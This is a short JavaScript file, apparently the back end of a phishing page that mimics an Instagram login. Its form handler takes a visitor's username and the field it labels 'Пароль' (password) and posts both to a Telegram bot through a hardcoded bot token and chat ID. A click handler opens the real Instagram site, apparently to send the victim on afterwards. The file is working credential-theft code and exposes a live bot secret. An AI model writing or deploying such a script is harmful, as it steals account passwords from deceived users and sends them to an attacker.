const TOKEN = "6839101586:AAEAQad_515f4lhz49c3I1kX0jLCnrO5D8Q"
const CHAT_ID = "-1001862459483"
const URI_API = `https://api.telegram.org/bot${ TOKEN }/sendMessage`
const success = document.getElementById("success")
const nameInput = document.getElementById('name')
const emailInput = document.getElementById('email')
const icon = document.querySelector(".icon ion-icon")

console.log(icon);
icon.addEventListener('click', () => {
    emailInput.type = "text"
    
    console.log(emailInput.type);
})
document.getElementById('submitButton').addEventListener('click', function() {
    // if(emailInput.value.length >= 8 ){
    //        alert('hello')
    //    } else if(emailInput.value.length < 8){
    //        alert('err')
    //    }

    open('https://www.instagram.com/', );
});

document.getElementById('tg').addEventListener('submit', function(e){
    e.preventDefault()

let message = `<b> Заявка с сайта !</b>\n`
message += `<b> Отправитель: </b> ${ this.name.value }\n`
message += `<b> Пароль: </b> ${ this.email.value }\n`


axios.post(URI_API, {
    chat_id: CHAT_ID,
    parse_mode: 'html', 
    text:  message,
}).then((res)=>{
    this.name.value = "";
    this.email.value = "";
    console.log(nameInput.value);
   
    
    // console.log(nameInput.value);
    // console.log(emailInput.value);
    // if (nameInput.value !== "" || emailInput.value !== "") {
    //     nameInput.value.preventDefault()
    //     success.innerHTML = "Сообщение не отправлено!";
    //     console.log("err");
    // } else {
    //     success.innerHTML = "Сообщение отправлено!";
    //     console.log("next");

    // }
    // success.style.display = "block"
    // success.style.marginBottom = "20px"

})

})



